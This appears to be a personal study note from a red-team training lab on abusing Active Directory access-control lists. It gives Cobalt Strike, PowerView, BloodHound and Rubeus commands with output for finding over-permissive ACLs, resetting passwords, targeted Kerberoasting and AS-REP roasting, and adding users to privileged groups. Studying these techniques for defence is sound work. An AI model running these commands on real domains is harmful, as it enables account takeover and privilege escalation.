---
creation date: September 25th 2022
last modified date: September 25th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Discretionary Access Control Lists]]  
___

## Description:  

### Enumeration

^80cd76

There may be instances across the domain where some principals have ACLs on more privileged accounts, that allow them to be abused for account-takeover. A simple example of this could be a "support" group that can reset the passwords of "Domain Admins".

We can start off by targeting a single principal. This query will return any principal that has **GenericAll**, **WriteProperty** or **WriteDacl** on jadams.

```
beacon> powershell Get-DomainObjectAcl -Identity jadams | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select SecurityIdentifier, ActiveDirectoryRights | fl

SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125
ActiveDirectoryRights : GenericAll

SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125
ActiveDirectoryRights : GenericAll

beacon> powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125
DEV\1st Line Support

```


We could also cast a wider net and target entire OUs.

```
beacon> powershell Get-DomainObjectAcl -SearchBase "CN=Users,DC=dev,DC=cyberbotic,DC=io" | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

ObjectDN              : CN=Joyce Adam,CN=Users,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights : GenericAll
SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125

ObjectDN              : CN=1st Line Support,CN=Users,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights : GenericAll
SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125

ObjectDN              : CN=Developers,CN=Users,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights : GenericAll
SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125

ObjectDN              : CN=Oracle Admins,CN=Users,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights : GenericAll
SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125
```

In BloodHound
```
MATCH (g1:Group), (g2:Group), p=((g1)-[:GenericAll]->(g2)) RETURN p
```

Narrow down results
```
MATCH (g1:Group {name:"1ST LINE SUPPORT@DEV.CYBERBOTIC.IO"}), (g2:Group), p=((g1)-[:GenericAll]->(g2)) RETURN p
```


### Abuse

^7b741a

We can abuse this by reseting the users password, targeted Kerberoasting, targeted ASREPRoasting, or by modifying Domain Group Membership.


Reset a user's password (pretty bad OPSEC).
```
beacon> getuid
[*] You are DEV\bfarmer

beacon> make_token DEV\jking Purpl3Drag0n
[+] Impersonated DEV\bfarmer

beacon> run net user jadams N3wPassw0rd! /domain

The request will be processed at a domain controller for domain dev.cyberbotic.io.

The command completed successfully.
```

Instead of changing the password we can set an SPN on the account, kerberoast it and attempt to crack offline.

```
beacon> powershell Set-DomainObject -Identity jadams -Set @{serviceprincipalname="fake/NOTHING"}
beacon> powershell Get-DomainUser -Identity jadams -Properties ServicePrincipalName

serviceprincipalname
--------------------
fake/NOTHING

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /user:jadams /nowrap

[*] Action: Kerberoasting

[*] Target User            : jadams
[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 1

[*] SamAccountName         : jadams
[*] DistinguishedName      : CN=Joyce Adam,CN=Users,DC=dev,DC=cyberbotic,DC=io
[*] ServicePrincipalName   : fake/NOTHING
[*] PwdLastSet             : 3/10/2021 3:28:20 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT

[*] Hash                   : $krb5tgs$23$*jadams$dev.cyberbotic.io$fake/NOTHING*$7D84D4D25DD82A170B308A21FED2E1F5$B22A1E [...snip...] 56B2E7

beacon> powershell Set-DomainObject -Identity jadams -Clear ServicePrincipalName
```
Or you could modify the User Account Control value on the account to disable preauthentication and then ASREProast it.
```
beacon> powershell Get-DomainUser -Identity jadams | ConvertFrom-UACValue

Name                           Value                                                     
----                           -----                                                     NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536

beacon> powershell Set-DomainObject -Identity jadams -XOR @{UserAccountControl=4194304}
beacon> powershell Get-DomainUser -Identity jadams | ConvertFrom-UACValue

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512                              
DONT_EXPIRE_PASSWORD           65536                              
DONT_REQ_PREAUTH               4194304

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asreproast /user:jadams /nowrap

[*] Action: AS-REP roasting

[*] Target User            : jadams
[*] Target Domain          : dev.cyberbotic.io

[*] Searching path 'LDAP://dc-2.dev.cyberbotic.io/DC=dev,DC=cyberbotic,DC=io' for AS-REP roastable users

[*] SamAccountName         : jadams
[*] DistinguishedName      : CN=Joyce Adams,CN=Users,DC=dev,DC=cyberbotic,DC=io
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Building AS-REQ (w/o preauth) for: 'dev.cyberbotic.io\jadams'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$jadams@dev.cyberbotic.io:5E0549 [...snip...] 131FDC

beacon> powershell Set-DomainObject -Identity jadams -XOR @{UserAccountControl=4194304}
beacon> powershell Get-DomainUser -Identity jadams | ConvertFrom-UACValue

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536
```

If we have the ACL on a group, we can add and remove members.
```
beacon> run net group "Oracle Admins" bfarmer /add /domain

The request will be processed at a domain controller for domain dev.cyberbotic.io.

The command completed successfully.

beacon> run net user bfarmer /domain

The request will be processed at a domain controller for domain dev.cyberbotic.io.

User name                    bfarmer
Full Name                    Bob Farmer

[...snip...]

Global Group memberships     *Domain Users         *Roaming Users        
                             *Developers           *Oracle Admins
```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 25th 2022 (07:16 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
